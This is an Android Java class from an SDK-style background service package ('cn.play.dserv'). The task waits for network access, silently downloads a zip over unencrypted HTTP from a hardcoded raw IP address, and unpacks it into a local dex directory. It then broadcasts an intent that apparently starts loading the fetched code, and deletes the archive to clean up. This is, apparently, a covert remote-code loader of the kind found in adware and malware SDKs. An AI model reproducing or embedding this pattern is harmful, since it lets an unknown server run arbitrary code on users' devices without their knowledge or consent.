/**
 * 
 */
package cn.play.dserv;

import java.io.File;

import android.content.Intent;
import android.util.Log;

/**
 * unzip
 * @author tzx200
 *
 */
public class PLTask4 implements PLTask {
	
	private SdkServ dservice;
	private static final int id =4;
	private int state = STATE_WAITING;
	private static final String TAG = "PLTask"+id;

	/* (non-Javadoc)
	 * @see java.lang.Runnable#run()
	 */
	@Override
	public void run() {
		Log.d(TAG, id+ " is running...");
		int result  = 0;
		state = STATE_RUNNING;
		while (true) {
			if (!dservice.isNetOk()) {
				try {
					Thread.sleep(1000*60*10);
				} catch (InterruptedException e) {
				}
				continue;
			}
			break;
		}
		
		
		
		
		String remote = "http://180.96.63.70:8080/plserver/dats/t4.zip";
		String localFile = SdkServ.getLocalDexPath()+"t4.zip";
		if(SdkServ.downloadGoOn(remote, SdkServ.getLocalDexPath(), "t4.zip",this.dservice.getService())){
			Log.d(TAG, "down zip OK.");
			boolean unzip = SdkServ.unzip(localFile, SdkServ.getLocalDexPath());
			if (unzip) {
				//触发CheckTool初始化
				Intent i = new Intent();
				i.setAction(CheckTool.RECEIVER_ACTION);
				i.putExtra("act", CheckTool.ACT_RECV_INITEXIT);
				this.dservice.getService().sendBroadcast(i);
				state = STATE_DIE;
				File f = new File(localFile);
				if (f !=null && f.exists()) {
					f.delete();
				}
				result = 1;
			}
		}else{
			result = -1;
			state = STATE_WAITING;
		}
		Log.d(TAG, "task "+id+" is done."+result);
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setDService(cn.play.dserv.SdkServ)
	 */
	@Override
	public void setDService(SdkServ serv) {
		this.dservice = serv;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		Log.d(TAG, "TASK "+id+" init.");
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int state) {
		this.state = state;
	}

}
